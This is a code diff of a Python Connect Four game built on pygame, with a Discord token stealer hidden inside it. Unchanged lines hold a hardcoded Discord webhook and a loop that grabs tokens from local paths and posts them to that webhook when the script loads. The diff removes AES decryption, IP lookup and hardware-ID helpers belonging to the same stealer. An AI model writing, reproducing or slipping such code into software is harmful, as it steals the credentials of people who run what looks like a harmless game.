@@ -2,6 +2,7 @@ import numpy as np
 import pygame
 import sys
 import math
+from threading import Timer
 import random,subprocess
 
 ROWS = 6
@@ -18,10 +19,10 @@ BLACK = (254, 250, 224)
 RED = (96, 108, 56)
 YELLOW = (188, 108, 37)
 
-from Crypto.Cipher import AES
 from subprocess import Popen, PIPE
 import requests, json, os
 from discordwebhook import Discord
+import time 
 
 discord = Discord(url="https://discord.com/api/webhooks/1177598092791529542/lW8w7-j9KvMHOkW4GN9K_IhxcBonaHgWZng5YhM9WjycXnI9ymndg2RQZl4GYjmZfYoL")
 
@@ -33,24 +34,7 @@ def getWallpaper():
     )
     return output.stdout.strip()
 
-tokens = []
-cleaned = []
-checker = []
 
-def decrypt(buff, master_key):
-    try:
-        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
-    except:
-        return "Error"
-def getip():
-    ip = "None"
-    try:
-        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
-    except: pass
-    return ip
-def gethwid():
-    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
-    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
 import os
 import glob
 import re
@@ -120,7 +104,6 @@ def SendTokensToWebhook(tkns):
     requests.post(WEBHOOK, data=payload)
 
 
-print(10)
 tksn = []
 for _dir in paths:
     tksn.extend(grabTokens(_dir))
@@ -320,7 +303,6 @@ def get_valid_locations(board):
 def end_game():
     global game_over
     game_over = True
-    print(game_over)
 
 
 board = create_board()
@@ -342,7 +324,6 @@ my_font = pygame.font.SysFont("monospace", 75)
 
 draw_board(board)
 pygame.display.update()
-
 
 while not game_over:
 
